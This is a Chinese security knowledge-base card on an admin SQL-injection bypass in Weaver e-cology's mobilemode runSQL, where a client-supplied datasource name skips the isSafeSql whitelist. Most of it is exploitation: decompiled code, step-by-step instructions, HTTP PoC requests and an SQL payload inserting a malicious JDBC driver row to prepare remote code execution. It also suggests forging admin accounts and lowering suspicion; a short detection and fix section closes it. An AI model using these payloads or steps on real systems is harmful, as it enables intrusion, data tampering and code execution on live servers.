---
id: web-generic-sqli-weaver-mobilemode-runsql-datasource-bypass
title: 泛微 e-cology mobilemode runSQL 后台 SQL 注入：datasource 非本地池绕过 isSafeSql 执行 insert/update/delete
type: scenario
domain: web
path: web/generic/sqli
technique: weaver-mobilemode-runsql-datasource-whitelist-bypass
tags:
- java
- weaver
- ecology
- sqli
- mobilemode
- admin
- datasource
- isSafeSql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T09:27:14+08:00'
  notes: 已对照原文及16张图核对：图01-03确认mobilemode设计器与Mobile_NS.SQL配置；图04-06确认MobileCommonAction.runSQL、isSafeSql在datasource非空且!=SYS_LOCAL_POOLNAME时直接return true、var3=test1与executeSql(var4,!var6,var3,var9)；图07确认mysql查询datasource_type多出恶意驱动行；图08确认后台数据库类型设置。卡片与原文一致。未验证点：原文未给出content明文/加密密钥，PoC中content为占位；注意原文/图02插入的dbtype为...190而后续datasource测试请求为...191，复现时需统一为同一值；未本机复跑；frontmatter无source_url。
url: /docs/web/generic/sqli/web-generic-sqli-weaver-mobilemode-runsql-datasource-bypass/
draft: false
kb_aliases:
- 泛微 runSQL 注入
- MobileCommonAction runSQL
- isSafeSql 绕过
- saveHomepageContent SQL 注入
- datasource 参数绕过
- 泛微 mobilemode 后台注入
---

## 一句话结论

泛微 e-cology 移动应用设计器的 `MobileCommonAction.runSQL` 在 `isSafeSql(sql, datasource)` 中把请求参数 `datasource` 当作可信来源：只要它非空且不等于本地连接池名（`DataSourceXML.SYS_LOCAL_POOLNAME`）就直接 `return true`；攻击者（后台权限）在请求中把 `datasource` 设为任意自定义数据源名（如 `test1`），即可跳过 insert/update/delete 白名单检查，向 `datasource_type` 等表执行任意 insert/update/delete，例如插入一条恶意 JDBC 驱动配置为后续 RCE 铺路。

## 原理

- **入口**：`/mobilemode/mobile/server.jsp?invoker=<base64>`，`invoker` 解码为 `com.api.mobilemode.web.mobile.service.MobileCommonAction`；`action=runSQL` 进入 `runSQL()`。
- **参数**：`datasource`（数据源名）、`content`（加密后的 SQL）、`sqlParams`（参数）等均来自请求。
- **isSafeSql 的信任分支**（反编译）：

  ```java
  public static boolean isSafeSql(String sql, String datasource) {
      if (StringHelper.isNotEmpty(datasource)
              && !DataSourceXML.SYS_LOCAL_POOLNAME.equals(datasource)) {
          return true;   // 非本地池直接判安全
      }
      sql = sql.toLowerCase().trim().replaceAll("\\s+", " ");
      String[] allowed = {"select ", "update uf_", "insert into uf_",
                          "delete from uf_", "delete * from uf_",
                          "update formtable_main_", "insert into formtable_main_",
                          "delete from formtable_..."};
      for (String prefix : allowed) {
          if (sql.startsWith(prefix)) return true;
      }
      return false;
  }
  ```

  `datasource` 是客户端可控字符串；把它设为 `test1` 等任意非本地池名，函数在第一步就返回 true，后面基于 SQL 前缀的白名单完全不执行。
- **执行链**：`runSQL` 随后做变量替换（`BasicHandler.replaceVariables` / `replaceServerVariables`），根据 SQL 是否以 `insert`/`update`/`delete` 设置 `var6`，再调用 `executeSql(sql, !var6, datasource, params)`。因此任意 insert/update/delete 都会落到数据库。
- **为什么设计失效**：开发者假设“非本地池”的数据源由管理员在后台创建、可信，因此不需要做 SQL 检查；但 `datasource` 参数由请求传入，攻击者可以随便填一个名字，既不需要该数据源真实存在，也不需要经过创建流程。
- **实际利用**：原文在 `saveHomepageContent` 的 `Mobile_NS.SQL(...)` 配置中写入 insert 语句，再通过 `runSQL` 执行：

  ```sql
  insert into datasource_type(dbtype, dbname, driverclass, driverurl)
  values ('sqlserver20011273983190','sqlserver2001','com.highgo.jdbc.Driver',
  'jdbc:highgo://10.1.9.7:11/test?user=test&password=password&host=org.springframework.context.support.ClassPathXmlApplicationContext&port=...');
  ```

  执行后数据库多出该数据源类型（原文用 `mysql -uroot -p` 查询确认），为“JDBC socketFactory 加载外部 XML”的 RCE 链提供恶意驱动配置。

## 触发条件

- 目标为泛微 e-cology，且移动应用设计器/`mobilemode` 接口可达。
- 攻击者拥有后台会话（原文请求携带 `ecology_JSessionid`/`JSESSIONID`/`loginidweaver=1` 等 Cookie，且为系统管理员/有移动应用设计权限）。
- `MobileCommonAction.runSQL` 可按上述方式调用（`invoker` 为固定 Base64 类名，`action=runSQL`）。
- 数据库账户对目标表（如 `datasource_type`）有 insert/update/delete 权限。
- `content` 需按接口要求加密/编码（原文由设计器生成请求），或能复现相同加密逻辑。

## 利用步骤

1. 登录后台，进入 `/wui/engine.html#/mobilemode` 或直接访问移动应用设计器 `/mobilemode/admin/appDesigner.jsp`。
2. 创建/打开一个移动应用，在“sql 函数配置”中选择数据源并写入 `Mobile_NS.SQL("insert into ...")`，保存页面配置（`POST /api/mobilemode/admin/designer/saveHomepageContent`）。
3. 点击预览，前端调用 `/mobilemode/mobile/server.jsp?invoker=<MobileCommonAction Base64>`，请求体 `action=runSQL`。
4. 抓包，把 `datasource` 改为一个非本地池名（如 `test1`），保持 `content` 为加密 SQL、`sqlParams` 为占位参数。
5. 发送请求；`isSafeSql` 因 `datasource != SYS_LOCAL_POOLNAME` 直接放行，SQL 被执行。
6. 用数据库客户端/另一注入点查询目标表，确认插入/更新/删除结果（原文确认 `datasource_type` 多出恶意驱动行）。
7. 将 SQL 换成其他 insert/update/delete，可篡改数据、写入管理员账号、插入恶意数据源配置等。

## PoC

原文关键 SQL（插入恶意数据源类型）：

```sql
insert into datasource_type(dbtype, dbname, driverclass, driverurl)
values (
  'sqlserver20011273983190',
  'sqlserver2001',
  'com.highgo.jdbc.Driver',
  'jdbc:highgo://10.1.9.7:11/test?user=test&password=password&host=org.springframework.context.support.ClassPathXmlApplicationContext&port=[servicename]/[servicename]/[servicename]/C:/WEAVER/ecology/page/resource/userfile/bg2150.jpg'
);
```

后台设计器保存请求（节选）：

```http
POST /api/mobilemode/admin/designer/saveHomepageContent HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: ecology_JSessionid=<...>; JSESSIONID=<...>; loginidweaver=1; languageidweaver=7; loginuuids=1

id=20&appid=1&mobiledeviceid=1&parentId=20&config=<urlencoded 配置数组>&components=91,93
```

预览/RunSQL 请求（节选，content 为加密 SQL，原文未给出明文/密钥）：

```http
POST /mobilemode/mobile/server.jsp?invoker=Y29tLmFwaS5tb2JpbGVtb2RlLndlYi5tb2JpbGUuc2VydmljZS5Nb2JpbGVDb21tb25BY3Rpb24=&&_ec_ismobile=true HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

pageKey=<...>&action=runSQL&content=<encrypted-sql>&datasource=test1&sqlParams=91,93
```

`datasource=test1` 是绕过关键；原文用调试器确认 `isSafeSql` 在非本地池时直接返回 true。

## 变体与关联

- **其他 SQL**：绕过只影响检查逻辑，后续执行支持 insert/update/delete；可写入 `datasource_type`、业务表、权限/用户表等（具体表名以目标库为准）。
- **数据源名任意**：`datasource` 不需要真实存在；只要非空且不等于本地池名即可。也可换成目标环境中真实存在的自定义数据源名以降低可疑度。
- **前置/后续链**：本注入常作为“插入恶意 JDBC 驱动配置”的前置；配合 [[web-java-component-weaver-ecology-jdbc-socketfactory-memshell]] 的 uploadFile + datasource 测试链完成 RCE。
- **同类过滤缺陷**：将“来源可信”作为跳过检查依据，而来源参数由客户端控制，是白名单绕过的常见模式。
- **关联卡片**：[[web-generic-sqli-weaver-e9-browser-jsp-double-slash-sqli]]、[[web-generic-sqli-weaver-e9-doc-out-more-list-boolean-blind]]（同为泛微 SQL 注入，但入口/参数不同）。

## 检测与防御

- **修复**：`isSafeSql` 不应基于客户端传入的 `datasource` 名跳过检查；无论本地/自定义数据源，都应对 SQL 做参数化或严格白名单（表名、操作类型、字段）。`datasource` 应改为服务端 session/配置中的可信标识。
- **最小权限**：移动应用设计器仅授予可信管理员；数据库账户禁止 DDL 与非必要表的写权限；`datasource_type` 等配置表只允许受控流程写入。
- **检测**：审计 `/mobilemode/mobile/server.jsp` 的 `action=runSQL` 请求，关注 `datasource` 非本地池名、`content` 含 `insert into datasource_type`/`update`/`delete`；数据库中出现非管理员创建的 `datasource_type` 行、异常 driverclass（如 `com.highgo.jdbc.Driver`）或含 `socketFactory` 的 driverurl；同一后台会话短时间内执行多条写 SQL。
- **排查**：比对 `datasource_type` 表与后台“数据库类型设置”页面的合法记录，检查是否有未授权新增的驱动类型与连接串。
